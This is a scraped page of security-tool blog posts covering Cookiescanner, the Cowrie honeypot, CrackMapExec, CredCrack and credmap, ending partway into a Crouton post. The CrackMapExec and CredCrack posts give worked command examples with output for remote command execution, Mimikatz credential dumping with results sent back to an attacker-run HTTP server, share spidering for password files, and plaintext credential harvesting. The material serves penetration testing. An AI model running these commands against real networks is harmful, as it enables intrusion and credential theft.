    <article class="post hentry" id="3618404717049786417" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Cookiescanner - Tool to Check the Cookie Flag for a Multiple Sites  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-3618404717049786417" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-dVDlqBqS8PI/VnirK7MXwmI/AAAAAAAAE8w/lPf6V6uPlxc/s1600/Cookiescanner.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-dVDlqBqS8PI/VnirK7MXwmI/AAAAAAAAE8w/lPf6V6uPlxc/s1600/Cookiescanner.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Tool to do more easy the web scan proccess to check if the secure and HTTPOnly flags are enabled in the cookies (path and expires too).
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        This tools allows probe multiple urls through a input file, by a google domain (looking in all subdomains) or by a unique url. Also, supports multiple output like json, xml and csv.
      </div> 
      <a name="more"></a>
      <br> 
      <h2 style="text-align: justify;"> <strong>Features:</strong></h2> 
      <ul> 
       <li style="text-align: justify;">&nbsp;Multiple options for output (and export using &gt;). xml, json, csv, grepable</li> 
      </ul> 
      <ul> 
       <li style="text-align: justify;">&nbsp;Check the flags in multiple sites by a file input (one per line). This is very useful for pentesters when they want check the flags in multiple sites.</li> 
      </ul> 
      <ul> 
       <li style="text-align: justify;">&nbsp;Google search. Search in google all subdomains and check the cookies for each domain.</li> 
      </ul> 
      <ul> 
       <li style="text-align: justify;">Colors for the normal output.</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <h2> Usage</h2> 
       <pre><code>Usage: cookiescanner.py [options] 
Example: ./cookiescanner.py -i ips.txt

Options:
  -h, --help            show this help message and exit
  -i INPUT, --input=INPUT
                        File input with the list of webservers
  -I, --info            More info
  -u URL, --url=URL     URL
  -f FORMAT, --format=FORMAT
                        Output format (json, xml, csv, normal, grepable)
  --nocolor             Disable color (for the normal format output)
  -g GOOGLE, --google=GOOGLE
                        Search in google by domain
</code></pre> 
       <br> 
       <h2> Requirements</h2> 
       <pre><code>requests &gt;= 2.8.1
BeautifulSoup &gt;= 4.2.1
</code></pre> 
       <br> 
       <h2> Install requirements</h2> 
       <pre><code>pip3 install --upgrade -r requirements.txt
</code></pre> 
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/Sinkmanu/cookiescanner" target="_blank">Download&nbsp;Cookiescanner</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="27608928007313499" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Cowrie - SSH Honeypot  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-27608928007313499" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-fyVXJmWOpeA/VZLxHaF-H3I/AAAAAAAAETY/i-MSjU-LAXs/s1600/honeypot.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="424" src="http://1.bp.blogspot.com/-fyVXJmWOpeA/VZLxHaF-H3I/AAAAAAAAETY/i-MSjU-LAXs/s640/honeypot.jpg" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Cowrie is a medium interaction SSH honeypot designed to log brute force attacks and, most importantly, the entire shell interaction performed by the attacker.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Cowrie is directly based on 
       <a href="http://github.com/desaster/kippo/">Kippo</a> by Upi Tamminen (desaster).
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Features</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Some interesting features:
      </div> 
      <ul> 
       <li style="text-align: justify;">Fake filesystem with the ability to add/remove files. A full fake filesystem resembling a Debian 5.0 installation is included</li> 
       <li style="text-align: justify;">Possibility of adding fake file contents so the attacker can 'cat' files such as /etc/passwd. Only minimal file contents are included</li> 
       <li style="text-align: justify;">Session logs stored in an <a href="http://user-mode-linux.sourceforge.net/">UML Compatible</a> format for easy replay with original timings</li> 
       <li style="text-align: justify;">Cowrie saves files downloaded with wget/curl or uploaded with SFTP and scp for later inspection</li> 
      </ul> 
      <div style="text-align: justify;">
        Additional functionality over standard kippo:
      </div> 
      <ul> 
       <li style="text-align: justify;">SFTP and SCP support for file upload</li> 
       <li style="text-align: justify;">Support for SSH exec commands</li> 
       <li style="text-align: justify;">Logging of direct-tcp connection attempts (ssh proxying)</li> 
       <li style="text-align: justify;">Logging in JSON format for easy processing in log management solutions</li> 
       <li style="text-align: justify;">Many, many additional commands</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Requirements</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Software required:
      </div> 
      <ul> 
       <li style="text-align: justify;">An operating system (tested on Debian, CentOS, FreeBSD and Windows 7)</li> 
       <li style="text-align: justify;">Python 2.5+</li> 
       <li style="text-align: justify;">Twisted 8.0+</li> 
       <li style="text-align: justify;">PyCrypto</li> 
       <li style="text-align: justify;">pyasn1</li> 
       <li style="text-align: justify;">Zope Interface</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Files of interest:</span></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">dl/ - files downloaded with wget are stored here</li> 
       <li style="text-align: justify;">log/cowrie.log - log/debug output</li> 
       <li style="text-align: justify;">log/cowrie.json - transaction output in JSON format</li> 
       <li style="text-align: justify;">log/tty/ - session logs</li> 
       <li style="text-align: justify;">utils/playlog.py - utility to replay session logs</li> 
       <li style="text-align: justify;">utils/createfs.py - used to create fs.pickle</li> 
       <li style="text-align: justify;">data/fs.pickle - fake filesystem</li> 
       <li style="text-align: justify;">honeyfs/ - file contents for the fake filesystem - feel free to copy a real system here</li> 
      </ul> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/micheloosterhof/cowrie" target="_blank">Download&nbsp;Cowrie</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8136165094865588523" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> CrackMapExec - A swiss army knife for pentesting Windows/Active Directory environments  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8136165094865588523" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-BLU0TwPZpVE/Vf-OUOs8NgI/AAAAAAAAEng/VjWtdQR1AEA/s1600/CrackMapExec.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="460" src="http://4.bp.blogspot.com/-BLU0TwPZpVE/Vf-OUOs8NgI/AAAAAAAAEng/VjWtdQR1AEA/s640/CrackMapExec.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        CrackMapExec is your one-stop-shop for pentesting Windows/Active Directory environments!
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        From enumerating logged on users and spidering SMB shares to executing psexec style attacks and auto-injecting Mimikatz into memory using Powershell!
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        The biggest improvements over the above tools are:
      </div> 
      <ul> 
       <li style="text-align: justify;">Pure Python script, no external tools required</li> 
       <li style="text-align: justify;">Fully concurrent threading</li> 
       <li style="text-align: justify;">Uses <strong>ONLY</strong> native WinAPI calls for discovering sessions, users, dumping SAM hashes etc...</li> 
       <li style="text-align: justify;">Opsec safe (no binaries are uploaded to dump clear-text credentials, inject shellcode etc...)</li> 
      </ul> 
      <div style="text-align: justify;"> 
      </div> 
      <a name="more"></a>
      <br> 
      <span style="font-size: large;"><b> Installation on Kali Linux</b></span>
      <br> 
      <br> Run 
      <code>pip install --upgrade -r requirements.txt</code>
      <br> 
      <br> 
      <span style="font-size: large;"><b> Usage</b></span>
      <br> 
      <pre><code>  ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______ 
 /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
|  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
|  |     |      /       /  /_\  \   |  |     |    &lt;   |  |\/|  |   /  /_\  \   |   ___/  |   __|    &gt;   &lt;   |   __|  |  |     
|  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
 \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                Swiss army knife for pentesting Windows/Active Directory environments | @byt3bl33d3r

                      Powered by Impacket https://github.com/CoreSecurity/impacket (@agsolino)

                                                  Inspired by:
                           @ShawnDEvans's smbmap https://github.com/ShawnDEvans/smbmap
                           @gojhonny's CredCrack https://github.com/gojhonny/CredCrack
                           @pentestgeek's smbexec https://github.com/pentestgeek/smbexec

positional arguments:
  target                The target range, CIDR identifier or file containing targets

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            Set how many concurrent threads to use
  -u USERNAME           Username, if omitted null session assumed
  -p PASSWORD           Password
  -H HASH               NTLM hash
  -n NAMESPACE          Namespace name (default //./root/cimv2)
  -d DOMAIN             Domain name
  -s SHARE              Specify a share (default: C$)
  -P {139,445}          SMB port (default: 445)
  -v                    Enable verbose output

Credential Gathering:
  Options for gathering credentials

  --sam                 Dump SAM hashes from target systems
  --mimikatz            Run Invoke-Mimikatz on target systems
  --ntds {ninja,vss,drsuapi}
                        Dump the NTDS.dit from target DCs using the specifed method
                        (drsuapi is the fastest)

Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              List shares
  --sessions            Enumerate active sessions
  --users               Enumerate users
  --lusers              Enumerate logged on users
  --wmi QUERY           Issues the specified WMI query

Account Bruteforcing:
  Options for bruteforcing SMB accounts

  --bruteforce USER_FILE PASS_FILE
                        Your wordlists containing Usernames and Passwords
  --exhaust             Don't stop on first valid account found

Spidering:
  Options for spidering shares

  --spider FOLDER       Folder to spider (defaults to share root dir)
  --pattern PATTERN     Pattern to search for in filenames and folders
  --patternfile PATTERNFILE
                        File containing patterns to search for
  --depth DEPTH         Spider recursion depth (default: 1)

Command Execution:
  Options for executing commands

  --execm {atexec,wmi,smbexec}
                        Method to execute the command (default: smbexec)
  -x COMMAND            Execute the specified command
  -X PS_COMMAND         Excute the specified powershell command

Shellcode/EXE/DLL injection:
  Options for injecting Shellcode/EXE/DLL's using PowerShell

  --inject {exe,shellcode,dll}
                        Inject Shellcode, EXE or a DLL
  --path PATH           Path to the Shellcode/EXE/DLL you want to inject on the target systems
  --procid PROCID       Process ID to inject the Shellcode/EXE/DLL into (if omitted, will inject within the running PowerShell process)
  --exeargs EXEARGS     Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)

Filesystem interaction:
  Options for interacting with filesystems

  --list PATH           List contents of a directory
  --download PATH       Download a file from the remote systems
  --upload SRC DST      Upload a file to the remote systems
  --delete PATH         Delete a remote file

There's been an awakening... have you felt it?
</code></pre> 
      <br> 
      <span style="font-size: large;"><b> Examples</b></span>
      <br> 
      <br> The most basic usage: scans the subnet using 100 concurrent threads:
      <br> 
      <pre><code>#~ python crackmapexec.py -t 100 172.16.206.0/24
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
</code></pre> Let's enumerate available shares:
      <br> 
      <pre><code>#~  python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --shares
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Available shares:
    SHARE           Permissions
    -----           -----------
    ADMIN$          READ, WRITE
    IPC$            NO ACCESS
    C$              READ, WRITE
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Available shares:
    SHARE           Permissions
    -----           -----------
    Users           READ, WRITE
    ADMIN$          READ, WRITE
    IPC$            NO ACCESS
    C$              READ, WRITE
[+] 172.16.206.132:445 DRUGCOMPANY-PC Available shares:
    SHARE           Permissions
    -----           -----------
    Users           READ, WRITE
    ADMIN$          READ, WRITE
    IPC$            NO ACCESS
    C$              READ, WRITE
</code></pre> Let's execute some commands on all systems concurrently:
      <br> 
      <pre><code>#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password -x whoami
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via SMBEXEC
nt authority\system

[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via SMBEXEC
nt authority\system

[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via SMBEXEC
nt authority\system
</code></pre> Same as above only using WMI as the code execution method:
      <br> 
      <pre><code>#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --execm wmi -x whoami
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via WMI
drugcompany-pc\administrator

[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via WMI
drugoutcove-pc\administrator

[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via WMI
desktop-qdvnp6b\drugdealer
</code></pre> Use an IEX cradle to run 
      <code>Invoke-Mimikatz.ps1</code> on all systems concurrently (PS script gets hosted automatically with an HTTP server), Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file and parsed for clear-text credentials:
      <br> 
      <pre><code>#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --mimikatz
[*] Press CTRL-C at any time to exit
[*] Note: This might take some time on large networks! Go grab a redbull!
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
172.16.206.130 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.133 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.132 - - [19/Aug/2015 18:57:41] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
172.16.206.133 - - [19/Aug/2015 18:57:45] "POST / HTTP/1.1" 200 -
[+] 172.16.206.133 Found plain text creds! Domain: drugoutcove-pc Username: drugdealer Password: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="abe2c7c4ddcee6eeffe38aeb">[email&nbsp;protected]</a>$
[*] 172.16.206.133 Saved POST data to Mimikatz-172.16.206.133-2015-08-19_18:57:45.log
172.16.206.130 - - [19/Aug/2015 18:57:47] "POST / HTTP/1.1" 200 -
[*] 172.16.206.130 Saved POST data to Mimikatz-172.16.206.130-2015-08-19_18:57:47.log
172.16.206.132 - - [19/Aug/2015 18:57:48] "POST / HTTP/1.1" 200 -
[+] 172.16.206.132 Found plain text creds! Domain: drugcompany-PC Username: drugcompany Password: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b0f9dcdfc6d5e7f5f5f491f0">[email&nbsp;protected]</a>#
[+] 172.16.206.132 Found plain text creds! Domain: DRUGCOMPANY-PC Username: drugdealer Password: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5c186c32281833182e293b2f1715180f7d1c">[email&nbsp;protected]</a>#
[*] 172.16.206.132 Saved POST data to Mimikatz-172.16.206.132-2015-08-19_18:57:48.log
</code></pre> Lets Spider the C$ share starting from the 
      <code>Users</code> folder for the pattern 
      <code>password</code> in all files and directories (concurrently):
      <br> 
      <pre><code>#~ python crackmapexec.py -t 150 172.16.206.0/24 -u username -p password --spider Users --depth 10 --pattern password
[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
[+] 172.16.206.132:445 DRUGCOMPANY-PC Started spidering
[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Started spidering
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Started spidering
//172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecrepasswords.lnk
//172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecretpasswords.lnk
//172.16.206.132/Users/drugcompany/Desktop/supersecretpasswords.txt
[+] 172.16.206.132:445 DRUGCOMPANY-PC Done spidering (Completed in 7.0349509716)
//172.16.206.133/Users/drugdealerboss/Documents/omgallthepasswords.txt
[+] 172.16.206.133:445 DRUGOUTCOVE-PC Done spidering (Completed in 16.2127850056)
//172.16.206.130/Users/drugdealer/AppData/Roaming/Microsoft/Windows/Recent/superpasswords.txt.lnk
//172.16.206.130/Users/drugdealer/Desktop/superpasswords.txt.txt
[+] 172.16.206.130:445 DESKTOP-QDVNP6B Done spidering (Completed in 38.6000130177)
</code></pre> 
      <br> For all available options, just run: 
      <code>python crackmapexec.py --help</code> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank">Download CrackMapExec</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1367440817146560791" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> CredCrack - Fast and Stealthy Credential Harvester  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1367440817146560791" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/--sTBScIT8vk/Vdvg3Q7ee_I/AAAAAAAAEhM/JMLKOkBFHxs/s1600/CredCrack.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="490" src="http://2.bp.blogspot.com/--sTBScIT8vk/Vdvg3Q7ee_I/AAAAAAAAEhM/JMLKOkBFHxs/s640/CredCrack.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        CredCrack is a fast and stealthy credential harvester. It exfiltrates credentials recusively in memory and in the clear. Upon completion, CredCrack will parse and output the credentials while identifying any domain administrators obtained. CredCrack also comes with the ability to list and enumerate share access and yes, it is threaded!
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        CredCrack has been tested and runs with the tools found natively in Kali Linux. CredCrack solely relies on having PowerSploit's "Invoke-Mimikatz.ps1" under the /var/www directory.
      </div> 
      <br> 
      <b><span style="font-size: large;">Help</span></b>
      <br> 
      <pre><code>usage: credcrack.py [-h] -d DOMAIN -u USER [-f FILE] [-r RHOST] [-es]
                    [-l LHOST] [-t THREADS]

CredCrack - A stealthy credential harvester by Jonathan Broche (@g0jhonny)

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  File containing IPs to harvest creds from. One IP per
                        line.
  -r RHOST, --rhost RHOST
                        Remote host IP to harvest creds from.
  -es, --enumshares     Examine share access on the remote IP(s)
  -l LHOST, --lhost LHOST
                        Local host IP to launch scans from.
  -t THREADS, --threads THREADS
                        Number of threads (default: 10)

Required:
  -d DOMAIN, --domain DOMAIN
                        Domain or Workstation
  -u USER, --user USER  Domain username

Examples: 

./credcrack.py -d acme -u bob -f hosts -es
./credcrack.py -d acme -u bob -f hosts -l 192.168.1.102 -t 20</code></pre> 
      <br> 
      <b><span style="font-size: large;">Examples</span></b>
      <br> 
      <br> 
      <b>Enumerating Share Access</b>
      <br> 
      <pre><code>./credcrack.py -r 192.168.1.100 -d acme -u bob --es
Password:
 ---------------------------------------------------------------------
  CredCrack v1.0 by Jonathan Broche (@g0jhonny)
 ---------------------------------------------------------------------

[*] Validating 192.168.1.102
[*] Validating 192.168.1.103
[*] Validating 192.168.1.100

 -----------------------------------------------------------------
 192.168.1.102 - Windows 7 Professional 7601 Service Pack 1 
 -----------------------------------------------------------------

 OPEN      \\192.168.1.102\ADMIN$ 
 OPEN      \\192.168.1.102\C$ 

 -----------------------------------------------------------------
 192.168.1.103 - Windows Vista (TM) Ultimate 6002 Service Pack 2 
 -----------------------------------------------------------------

 OPEN      \\192.168.1.103\ADMIN$ 
 OPEN      \\192.168.1.103\C$ 
 CLOSED    \\192.168.1.103\F$ 

 -----------------------------------------------------------------
 192.168.1.100 - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 
 -----------------------------------------------------------------

 CLOSED    \\192.168.1.100\ADMIN$ 
 CLOSED    \\192.168.1.100\C$ 
 OPEN      \\192.168.1.100\NETLOGON 
 OPEN      \\192.168.1.100\SYSVOL 

[*] Done! Completed in 0.8s
</code></pre> 
      <br> 
      <b>Harvesting credentials</b>
      <br> 
      <pre><code>./credcrack.py -f hosts -d acme -u bob -l 192.168.1.100
Password:

 ---------------------------------------------------------------------
  CredCrack v1.0 by Jonathan Broche (@g0jhonny)
 ---------------------------------------------------------------------

[*] Setting up the stage
[*] Validating 192.168.1.102
[*] Validating 192.168.1.103
[*] Querying domain admin group from 192.168.1.102
[*] Harvesting credentials from 192.168.1.102
[*] Harvesting credentials from 192.168.1.103

                  The loot has arrived...
                         __________
                        /\____;;___\    
                       | /         /    
                       `. ())oo() .      
                        |\(%()*^^()^\       
                       %| |-%-------|       
                      % \ | %  ))   |       
                      %  \|%________|       


[*] Host: 192.168.1.102 Domain: ACME User: jsmith Password: Good0ljm1th
[*] Host: 192.168.1.103 Domain: ACME User: daguy Password: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8dddcdfefefabdffe9bc">[email&nbsp;protected]</a>!

     1 domain administrators found and highlighted in yellow above!

[*] Cleaning up
[*] Done! Loot may be found under /root/CCloot folder
[*] Completed in 11.3s
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/gojhonny/CredCrack" target="_blank">Download&nbsp;CredCrack</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="2533611217693028417" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> credmap - The Credential Mapper  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-2533611217693028417" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-hob4RuBBwcE/Vm3TC8thQrI/AAAAAAAAE7Q/bX1Xa2eHZo4/s1600/credmap.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://4.bp.blogspot.com/-hob4RuBBwcE/Vm3TC8thQrI/AAAAAAAAE7Q/bX1Xa2eHZo4/s640/credmap.png" width="543"></a>
      </div> 
      <br> 
      <br> 
      <div style="text-align: justify;">
        Credmap is an open source tool that was created to bring awareness to the dangers of credential reuse. It is capable of testing supplied user credentials on several known websites to test if the password has been reused on any of these.
      </div> 
      <a name="more"></a>
      <br> 
      <h3> Help Menu</h3> 
      <pre><code>Usage: credmap.py --email EMAIL | --user USER | --load LIST [options]

Options:
  -h/--help             show this help message and exit
  -v/--verbose          display extra output information
  -u/--username=USER..  set the username to test with
  -p/--password=PASS..  set the password to test with
  -e/--email=EMAIL      set an email to test with
  -l/--load=LOAD_FILE   load list of credentials in format USER:PASSWORD
  -x/--exclude=EXCLUDE  exclude sites from testing
  -o/--only=ONLY        test only listed sites
  -s/--safe-urls        only test sites that use HTTPS.
  -i/--ignore-proxy     ignore system default HTTP proxy
  --proxy=PROXY         set proxy (e.g. "socks5://192.168.1.2:9050")
  --list                list available sites to test with
</code></pre> 
      <br> 
      <h3> Examples </h3> 
      <pre><code>./credmap.py --username janedoe --email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="107a717e75747f7550757d71797c3e737f7d">[email&nbsp;protected]</a>
./credmap.py -u johndoe -e <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dfb5b0b7b1bbb0ba9fbab2beb6b3f1bcb0b2">[email&nbsp;protected]</a> --exclude "github.com, live.com"
./credmap.py -u johndoe -p abc123 -vvv --only "linkedin.com, facebook.com"
./credmap.py -e <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b2d8d3dcd7d6ddd7f2d7cad3dfc2ded79cd1dddf">[email&nbsp;protected]</a> --verbose --proxy "https://127.0.0.1:8080"
./credmap.py --load list.txt
./credmap.py --list
</code></pre> 
      <br> 
      <h3> Prerequisites</h3> To get started, you will need Python 2.6+ (previous versions may work as well, however I haven't tested them)
      <br> 
      <ul class="list"> 
       <li>Python 2.6+</li> 
       <li>Git (Optional)</li> 
      </ul> 
      <br> 
      <h3> Running the program</h3> To run credmap, simply execute the main script "credmap.py".
      <br> 
      <pre><code>$ python credmap.py -h</code></pre> 
      <br> 
      <h3> Video</h3> 
      <center> 
       <iframe allowfullscreen frameborder="0" height="480" src="https://www.youtube.com/embed/rjXlCRRPq0g" width="640"></iframe>
      </center> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/lightos/credmap#sthash.buzbAKdv.dpuf" target="_blank">Download&nbsp;credmap</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8502857453386146275" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Crouton - Chromium OS Universal Chroot Environment  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8502857453386146275" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-tZfgxv_JC14/VX5J5GmytlI/AAAAAAAAEOA/MjjxiSfloHA/s1600/Coruton.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="354" src="http://3.bp.blogspot.com/-tZfgxv_JC14/VX5J5GmytlI/AAAAAAAAEOA/MjjxiSfloHA/s640/Coruton.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        crouton is a set of scripts that bundle up into an easy-to-use, Chromium OS-centric chroot generator. Currently Ubuntu and Debian are supported (using debootstrap behind the scenes), but "Chromium OS Debian, Ubuntu, and Probably Other Distros Eventually Chroot Environment" doesn't acronymize as well (crodupodece is admittedly pretty fun to say, though).
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> "crouton"...an acronym?</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        It stands for 
       <em>ChRomium Os Universal chrooT envirONment</em> ...or something like that. Do capitals really matter if caps-lock has been (mostly) banished, and the keycaps are all lower-case?
      </div> 
      <div style="text-align: justify;">
        Moving on...
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Who's this for?</span></b>
